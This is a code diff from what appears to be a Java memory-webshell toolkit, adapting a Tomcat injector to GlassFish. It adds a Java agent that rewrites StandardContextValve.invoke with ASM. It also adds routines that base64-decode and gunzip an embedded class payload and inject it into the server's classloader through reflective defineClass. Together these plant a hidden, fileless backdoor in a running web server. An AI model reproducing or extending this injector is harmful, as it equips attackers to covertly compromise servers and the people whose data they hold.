@@ -1,4 +1,4 @@
-package com.reajason.javaweb.memshell.injector.tomcat;
+package com.reajason.javaweb.memshell.injector.glassfish;
 
 import org.objectweb.asm.*;
 
@@ -13,12 +13,16 @@ import java.util.zip.GZIPInputStream;
  * @author ReaJason
  * @since 2025/3/26
  */
-public class TomcatContextValveAgentInjector extends ClassLoader implements ClassFileTransformer {
+public class GlassFishContextValveAgentInjector extends ClassLoader implements ClassFileTransformer {
     private static final String TARGET_CLASS = "org/apache/catalina/core/StandardContextValve";
     private static final String TARGET_METHOD_NAME = "invoke";
 
     public static String getClassName() {
         return "{{advisorName}}";
+    }
+
+    public static String getBase64String() {
+        return "{{base64String}}";
     }
 
     public static void premain(String args, Instrumentation inst) throws Exception {
@@ -31,7 +35,7 @@ public class TomcatContextValveAgentInjector extends ClassLoader implements Clas
 
     private static void launch(Instrumentation inst) throws Exception {
         System.out.println("MemShell Agent is starting");
-        inst.addTransformer(new TomcatContextValveAgentInjector(), true);
+        inst.addTransformer(new GlassFishContextValveAgentInjector(), true);
         for (Class<?> allLoadedClass : inst.getAllLoadedClasses()) {
             String name = allLoadedClass.getName();
             if (TARGET_CLASS.replace("/", ".").equals(name)) {
@@ -46,6 +50,7 @@ public class TomcatContextValveAgentInjector extends ClassLoader implements Clas
     public byte[] transform(final ClassLoader loader, String className, Class<?> classBeingRedefined,
                             ProtectionDomain protectionDomain, byte[] bytes) {
         if (TARGET_CLASS.equals(className)) {
+            defineTargetClass(loader);
             try {
                 ClassReader cr = new ClassReader(bytes);
                 ClassWriter cw = new ClassWriter(cr, ClassWriter.COMPUTE_MAXS | ClassWriter.COMPUTE_FRAMES) {
@@ -155,6 +160,60 @@ public class TomcatContextValveAgentInjector extends ClassLoader implements Clas
                 index += argumentTypes[i].getSize();
             }
             return index;
+        }
+    }
+
+    @SuppressWarnings("all")
+    public static byte[] decodeBase64(String base64Str) throws Exception {
+        Class<?> decoderClass;
+        try {
+            decoderClass = Class.forName("java.util.Base64");
+            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
+            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
+        } catch (Exception ignored) {
+            decoderClass = Class.forName("sun.misc.BASE64Decoder");
+            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
+        }
+    }
+
+    @SuppressWarnings("all")
+    public static byte[] gzipDecompress(byte[] compressedData) {
+        ByteArrayOutputStream out = new ByteArrayOutputStream();
+        GZIPInputStream gzipInputStream = null;
+        try {
+            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
+            byte[] buffer = new byte[4096];
+            int n;
+            while ((n = gzipInputStream.read(buffer)) > 0) {
+                out.write(buffer, 0, n);
+            }
+            return out.toByteArray();
+        } catch (Exception e) {
+            throw new RuntimeException(e);
+        } finally {
+            try {
+                if (gzipInputStream != null) {
+                    gzipInputStream.close();
+                }
+                out.close();
+            } catch (Exception ignored) {
+            }
+        }
+    }
+
+    @SuppressWarnings("all")
+    public void defineTargetClass(ClassLoader loader) {
+        try {
+            loader.loadClass(getClassName());
+            return;
+        } catch (ClassNotFoundException ignored) {
+        }
+        try {
+            byte[] classBytecode = gzipDecompress(decodeBase64(getBase64String()));
+            java.lang.reflect.Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
+            defineClass.setAccessible(true);
+            defineClass.invoke(loader, classBytecode, 0, classBytecode.length);
+        } catch (Exception ignored) {
         }
     }
 }
